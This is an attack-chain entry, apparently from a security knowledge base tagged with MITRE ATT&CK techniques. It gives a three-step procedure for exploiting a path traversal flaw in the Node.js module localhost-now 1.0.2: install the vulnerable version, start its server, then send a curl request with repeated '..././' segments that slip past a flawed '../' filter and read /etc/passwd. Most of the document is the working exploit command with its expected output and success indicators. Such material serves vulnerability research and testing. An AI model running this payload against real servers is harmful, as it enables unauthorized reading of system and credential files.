---
tags:
  - path-traversal
  - node-js
  - arbitrary-file-read
  - bypass
type: attack_chain
tools:
  - '[[tools/localhost-now]]'
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
verified: false
platforms:
  - Web
  - Linux
  - Node.js
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Install-localhost-now-Module]]'
  - '[[procedures/Start-localhost-now-Server]]'
  - '[[procedures/Exploit-Path-Traversal-in-localhost-now]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[File and Directory Discovery]]'
updated_at: '2025-12-14T17:26:11.687Z'
description: >-
  Multi-stage attack exploiting a path traversal vulnerability in the Node.js
  localhost-now module version 1.0.2, bypassing a flawed mitigation to achieve
  arbitrary file reads on the server.
skill_level: intermediate
impact_level: high
id: 17f7a1bd-b221-4348-8fef-9fa289fb6651
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[File and Directory Discovery]]'
---
# Bypass Defective Path Traversal Fix in localhost-now to Read Arbitrary Files

Multi-stage attack chain demonstrating exploitation of a path traversal vulnerability in the Node.js module 'localhost-now' version 1.0.2. This bypasses a previous defective fix (from report #312889) by using '..././' payloads that evade simple '../' string deletion in lib/app.js line 17, allowing arbitrary file reads like /etc/passwd via a local web server.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Install Module] --> B[Start Server]
    B --> C[Exploit Path Traversal]
    C --> D[Arbitrary File Read]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/localhost-now]]
- [[tools/curl]]
- npm (Node Package Manager)

### Target Environment

- Node.js environment (v8.10.0 or compatible)
- Linux OS for file system traversal testing
- Local network access to port 5432
- NPM 5.6.0 or later

### Initial Access Requirements

- Local machine with Node.js installed
- No remote credentials needed; exploits local server
- Administrative access not required for setup

## Detailed Attack Procedures

### Step 1: Install the localhost-now Module
procedure: [[procedures/Install-localhost-now-Module]]

**Objective**: Install the vulnerable localhost-now module version 1.0.2 to set up the exploitable web server.

**Instructions**: Use npm to install the module from the npm registry. This prepares the environment for running the server.

Execute [[commands/npm-install-localhost-now]]:

```bash
npm install localhost-now@1.0.2
```

**Expected Output**: Installation logs showing successful download and setup of the module in node_modules.

**Success Indicators**:
- Module files appear in node_modules/localhost-now
- No installation errors in npm output

### Step 2: Start the localhost-now Server
procedure: [[procedures/Start-localhost-now-Server]]

**Objective**: Launch the vulnerable web server on localhost port 5432 to expose the path traversal endpoint.

**Instructions**: Run the localhost-now command to start serving files from the current directory. Ensure you're in a directory with test files or the target system files are accessible via traversal.

Execute [[commands/localhost-now-start-server]]:

```bash
localhost 5432
```

**Expected Output**: "Web Server started on localhost:5432" message, confirming the server is listening.

**Success Indicators**:
- Server process running without errors
- Accessible via browser or curl on http://localhost:5432

### Step 3: Exploit Path Traversal to Read Arbitrary Files
procedure: [[procedures/Exploit-Path-Traversal-in-localhost-now]]

**Objective**: Send a crafted HTTP request to bypass the path normalization flaw and read sensitive files like /etc/passwd.

**Instructions**: With the server running, use curl to send a request with a '..././' payload that evades the '../' deletion in lib/app.js. Replace IP with localhost or the server's IP. The --path-as-is flag prevents curl from normalizing the path.

Execute [[commands/curl-path-traversal-exploit]]:

```bash
curl -v --path-as-is "http://localhost:5432/..././..././..././..././..././..././..././..././..././..././etc/passwd"
```

**Expected Output**: Verbose curl output followed by contents of /etc/passwd, e.g., "root:x:0:0:root:/root:/usr/bin/fish\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n..."

**Success Indicators**:
- File contents returned in response body
- No 404 or access denied errors
- Confirmation of traversal by reading non-public files

## Attack Chain Summary

### Key Achievements

1. Successful installation and setup of the vulnerable localhost-now module
2. Launch of the exploitable local web server
3. Bypass of path traversal mitigation to read arbitrary system files, demonstrating unauthorized access

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[File and Directory Discovery]] File and Directory Discovery

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Discovery]] Discovery

---
*Last updated: 2023-10-01T00:00:00Z*
